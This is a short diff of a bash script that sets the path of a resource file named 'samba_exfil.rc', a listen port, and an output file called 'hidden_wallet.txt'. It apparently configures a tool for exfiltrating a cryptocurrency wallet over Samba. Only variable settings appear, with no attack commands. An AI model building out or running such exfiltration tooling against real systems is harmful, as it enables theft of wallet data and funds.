@@ -1,6 +1,6 @@
 #!/bin/bash
 
-RC_SCRIPT="samba_exfil.rc"
+RC_SCRIPT="/home/dcloud/coinbank/samba_exfil.rc"
 SAVE_TO="/home/dcloud/coinbank"
 LISTEN_PORT=9999
 SAVE_AS="$SAVE_TO/hidden_wallet.txt"
